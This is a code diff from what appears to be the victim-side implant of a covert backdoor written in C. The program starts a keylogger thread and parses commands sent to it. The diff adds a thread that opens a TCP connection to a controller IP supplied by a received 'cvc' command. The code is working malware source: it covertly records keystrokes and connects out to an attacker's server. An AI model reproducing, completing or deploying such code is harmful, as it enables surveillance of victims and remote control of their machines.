@@ -3,10 +3,9 @@
 #include "extern.h"
 
 
-pid_t pid;
-
 int main(int argc, char *argv[]) {
     struct options_victim opts;
+    pthread_t select_thread;
     pthread_t keylogger_thread;
     pthread_t cvc_thread;
 
@@ -21,7 +20,7 @@ int main(int argc, char *argv[]) {
 
     program_setup();
     options_victim_init(&opts);
-    initialize_victim_server(&opts);
+
 
     if (pthread_create(&keylogger_thread, NULL, activate_keylogger, (void*)&opts) != 0) {
         perror("pthread_create error: keylogger_thread");
@@ -62,38 +61,28 @@ void options_victim_init(struct options_victim *opts) {
 }
 
 
-void initialize_victim_server(struct options_victim *opts) {
-    struct sockaddr_in victim_address;
-    int option = TRUE;
+void* select_victim(void *arg) {
+    struct options_victim* ov;
+    struct sockaddr_in cvc_address;
 
-    opts->victim_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (opts->victim_socket == -1) {
-        perror("socket() ERROR\n");
-        exit(EXIT_FAILURE);
+    ov = (struct options_victim*)arg;
+
+    if ((ov->victim_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        printf("socket creation failed");
+        exit(0);
     }
 
-    victim_address.sin_family = AF_INET;
-    victim_address.sin_port = htons(DEFAULT_PORT);
-    victim_address.sin_addr.s_addr = htonl(INADDR_ANY);
+    memset(&cvc_address, 0, sizeof(cvc_address));
 
-    if (victim_address.sin_addr.s_addr == (in_addr_t) -1) {
-        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    // Filling server information
+    cvc_address.sin_family = AF_INET;
+    cvc_address.sin_port = htons(CVC_PORT);
+    cvc_address.sin_addr.s_addr = inet_addr(ov->cvc_ip);
+
+    if (connect(ov->victim_socket, (struct sockaddr*)&cvc_address,
+                sizeof(cvc_address)) < 0) {
+        printf("\n Error : Connect Failed \n");
     }
-
-    option = 1;
-    setsockopt(opts->victim_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
-    setsockopt(opts->victim_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));
-
-    if (bind(opts->victim_socket, (struct sockaddr *) &victim_address, sizeof(struct sockaddr_in)) == -1) {
-        perror("bind() ERROR\n");
-        exit(EXIT_FAILURE);
-    }
-
-
-//    if (listen(opts->victim_socket, BACKLOG) == -1) {
-//        perror("listen() ERROR\n");
-//        exit(EXIT_FAILURE);
-//    }
 }
 
 
@@ -186,18 +175,19 @@ void extract_instruction(u_char *args) {
 
 void execute_instruction(u_char *args) {
     struct options_victim* ov;
+    pthread_t select_thread;
     char **commands;
-    char *cvc_token;
     ov = (struct options_victim*)args;
 
     if (strstr(ov->instruction, "cvc") != NULL) {
         ov->cvc = TRUE;
         strcpy(ov->cvc_ip, ov->instruction + 4);
-        printf("cvc ip = %s\n", ov->cvc_ip);
-        // TODO: IF COMMAND = CVC_SERVER {IP}
+        if (pthread_create(&select_thread, NULL, select_victim, (void*)args) != 0) {
+            perror("pthread_create error: keylogger_thread");
+            exit(EXIT_FAILURE);
+        }
     }
     else if (strcmp(ov->instruction, "keylogger") == 0) {
-        // TODO: IF COMMAND = KEYLOGGER
         ov->keylogger = TRUE;
     }
     else if (strstr(ov->instruction, "target") != NULL) {
